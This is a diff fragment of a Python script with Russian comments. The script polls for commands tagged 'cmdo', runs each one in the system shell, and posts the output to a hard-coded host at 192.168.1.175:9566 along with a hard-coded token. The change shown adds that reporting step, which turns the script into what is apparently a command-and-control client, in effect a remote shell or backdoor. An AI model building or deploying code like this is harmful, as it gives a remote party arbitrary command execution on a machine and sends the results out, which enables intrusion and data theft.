@@ -4,10 +4,10 @@ import time
 import requests
 
 
-async def fun1(x):
-    print(x**2)
-    await asyncio.sleep(3)
-    print('fun1 завершена')
+async def send_server(output):
+    lk = 'http://192.168.1.175:9566/push/pc0'
+    r = requests.post(lk, data={'token': 'nvw2ztjjv9y5', 'answer' : output}).json()
+    print(r)
 
 
 async def poling():
@@ -20,7 +20,7 @@ async def poling():
         for i in l:
             c = i[1].split(',') 
             if c[0] == 'cmdo':
-                await cmdo(c[1])
+                await cmdo(c[1], i[0])
         await asyncio.sleep(1)
 
 
@@ -29,7 +29,7 @@ async def main():
 
     await task1
 
-async def cmdo(com):  # output от выполнения команды в cmd
+async def cmdo(com, id):  # output от выполнения команды в cmd
         try:
             res = subprocess.check_output(com, shell=True)
         except Exception as e:
@@ -41,7 +41,7 @@ async def cmdo(com):  # output от выполнения команды в cmd
                 res = res.decode('cp866')
             except Exception as e:
                 pass
-        print('Успешно:\n' + res)
+        send_server([id, 'Успешно:\n' + res])
 
 
 asyncio.run(main())
